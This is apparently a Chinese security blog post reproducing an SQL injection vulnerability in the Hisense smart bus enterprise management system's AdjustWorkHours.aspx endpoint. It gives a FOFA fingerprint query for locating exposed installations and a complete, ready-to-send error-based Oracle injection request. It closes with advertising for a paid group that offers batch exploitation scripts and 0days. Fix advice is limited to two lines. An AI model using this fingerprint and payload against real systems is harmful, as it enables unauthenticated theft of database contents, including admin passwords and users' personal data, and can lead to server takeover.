#  「漏洞复现」海信智能公交企业管理系统 AdjustWorkHours.aspx SQL注入漏洞   
冷漠安全  冷漠安全   2024-11-26 08:47  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
**0x01 免责声明**  
  
**免责声明**  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
**产品介绍**  
  
海信智能公交企业管理系统是一套以智慧车、智慧站、智慧场为基础，以大数据和人工智能技术的公交云脑为核心，旨在全面提升公交企业的安全保障能力、运营生产效率、企业管理水平、决策分析能力和乘客出行体验的综合管理系统。基于大数据和人工智能技术构建的核心处理平台，具有数据接入处理能力、逻辑推理能力以及微服务架构的智慧公交五大应用能力。它能够对收集到的各种数据进行分析和处理，为企业管理提供智能化决策支持。  
  
0x03  
  
**漏洞威胁**  
  
海信智能公交企业管理系统 AdjustWorkHours.aspx 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。  
  
0x04  
  
**漏洞环境**  
  
FOFA:  
```
body="var _FactoryData"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qeaeGFGS2kITL8Mic3sIYHt9PdJnmG4Gvleaiaxm9b22MXsfIkDTPibHXnmRJpKIaibNEs1WSO11cZog/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
**漏洞复现**  
  
PoC  
```
GET /YZSoft/Forms/XForm/BM/MaintainComManagement/AdjustWorkHours.aspx?key=1%27+AND+4208%3D%28SELECT+UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT+%28CASE+WHEN+%284208%3D4208%29+THEN+1+ELSE+0+END%29+FROM+DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29+FROM+DUAL%29--+dSSu HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qeaeGFGS2kITL8Mic3sIYHtdMl6dqZ2Vnm9ZVeXPLWOIh0LUU34UoyGvlK8tAFaeEOULXyGib62sEw/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
**批量脚本验证**  
  
Nuclei验证脚本已发布  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qeaeGFGS2kITL8Mic3sIYHtaCOibWoLoJVJJKb45sT1SM4zCic2x4DF7O9R6rhep6mQRDibiaSgAf6hsw/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
**修复建议**  
  
关闭互联网暴露面或接口设置访问权限  
  
升级至安全版本  
  
0x08  
  
**加入我们**  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全交个朋友，限时优惠券：加入立减25星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qeaeGFGS2kITL8Mic3sIYHtYGNJd677Rj7uViaOtkn9x9wJ1dx21of9ZDWibeXs0bcXreMQMq2xFeog/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0qeaeGFGS2kITL8Mic3sIYHtnrib7Ef3ic0Pd38vrqv48DKWgNWL4nmfU3nNByPjmicq3sEXdeiaOjPJVQ/640?wx_fmt=gif&from=appmsg "")  
  
  
